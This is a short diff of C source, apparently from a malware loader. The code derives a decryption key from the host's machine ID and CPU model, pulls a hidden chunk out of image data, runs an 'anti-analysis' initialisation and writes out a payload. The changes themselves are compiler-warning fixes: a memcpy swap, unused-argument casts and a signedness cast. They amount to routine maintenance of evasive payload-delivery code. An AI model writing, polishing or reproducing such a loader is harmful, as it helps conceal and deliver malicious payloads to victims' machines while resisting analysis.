@@ -55,7 +55,7 @@ void derive_key(uint8_t key[32]) {
 
     // Fallback if read failed or file empty
     if (bytes_read <= 0) {
-        strncpy((char*)machine_id, FALLBACK_MACHINE_ID, 32);
+        memcpy(machine_id, FALLBACK_MACHINE_ID, 32);
     }
 
     // 2. CPU Model
@@ -115,6 +115,7 @@ uint8_t* extract_chunk(uint8_t* img_data, size_t img_len, size_t* out_len) {
 int main(int argc, char* argv[]) {
     // Anti-Analysis Init
     init_crypto_tables();
+    (void)argc; (void)argv;
 
     // 1. Derive Key
     uint8_t key[32];
@@ -171,7 +172,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    if (write((int)fd, payload, payload_len) != payload_len) {
+    if (write((int)fd, payload, payload_len) != (ssize_t)payload_len) {
         return 1;
     }
 
